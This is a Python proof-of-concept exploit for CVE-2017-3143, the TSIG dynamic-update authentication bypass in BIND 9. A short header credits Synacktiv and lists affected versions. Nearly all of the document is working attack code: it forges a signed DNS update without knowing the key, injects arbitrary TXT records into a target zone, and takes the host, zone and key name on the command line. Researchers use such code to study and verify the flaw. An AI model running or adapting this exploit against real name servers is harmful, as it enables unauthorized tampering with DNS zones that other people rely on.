'''
CVE-2017-3143 zone update PoC exploit. Thanks Synacktiv [synacktiv.ninja] for vulnerability publication.
The issue was tested and proven to affect the following BIND version:
- BIND 9.9.10
- BIND 9.10.5
- BIND 9.11.1
According to ISC, the following versions are affected:
- 9.4.0 to 9.8.8
- 9.9.0 to 9.9.10­P1
- 9.10.0 to 9.10.5­P1
- 9.11.0 to 9.11.1­P1
- 9.9.3­S1 to 9.9.10­S2
- 9.10.5­S1 to 9.10.5­S2

Details: http://www.synacktiv.ninja/ressources/CVE-2017-3143_BIND9_TSIG_dynamic_updates_vulnerability_Synacktiv.pdf
'''

import dns.query
import dns.zone
import dns.tsigkeyring
import dns.tsig
import dns.message
import dns.update
from time import time, sleep
from struct import pack


def get_update(zone, size_to_absorb):
    req = dns.update.Update(zone)
    # update this with whatever change you want to do
    req.delete('i.am.injected.zone', 'txt')
    req.add('i.am.injected.zone', 3600, 'txt', 'injected')
    # padding needed to absorb the appended answer data
    req.delete('padding', 'txt')
    req.add('padding', 3600, 'txt', 'A' * size_to_absorb)
    return req


def exploit(host, zone, keyname, fudge=300):
keyring = dns.tsigkeyring.from_text({
    keyname: 'wrong_key'.encode('base64')
})
    ts = time()
    sz = 12 + sum(len(e) + 1 for e in (zone).split('.')) + 1 + 4

    # create the forged request
    forged = get_update(zone, sz)
    # create the trigger request
    trigger = dns.update.Update(zone)
    # enable tsig with a valid keyname
    trigger.use_tsig(keyring, keyname=keyname, algorithm=dns.tsig.HMAC_SHA256)
    # get forged data and strip the last sz bytes of padding data
    forged_data = forged.to_wire()
    forged_data = forged_data[2:-sz]

    # set trigger hmac to forged request
    trigger.request_hmac = forged_data
    trigger.time_func = lambda: ts

    print '[+] sending trigger request'
    ans = dns.query.tcp(trigger, host)
    print '[+] signed request mac is %s' % ans.mac.encode('hex')
    # patch id
    forged.id = len(forged_data)

    forged.use_tsig(keyring, keyname=keyname, original_id=len(
        forged_data), algorithm=dns.tsig.HMAC_SHA256)
    # keep same ts
    forged.time_func = lambda: ts
    # replace hmac
    forged.request_hmac = ans.mac

    # patch additionnal_record_count in pad data -> 0
    data = ans.to_wire()[:11] + '\x00' + ans.to_wire()[12:sz]
    forged.authority[-1][0].strings[0] = data

    p = dns.query.tcp(forged, host)
    if p.rcode():
        print '[-] update failed, got errcode %d' % p.rcode()
    return

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('host')
    p.add_argument('zone')
    p.add_argument('keyname')
    o = p.parse_args()

    exploit(o.host, o.zone, o.keyname)
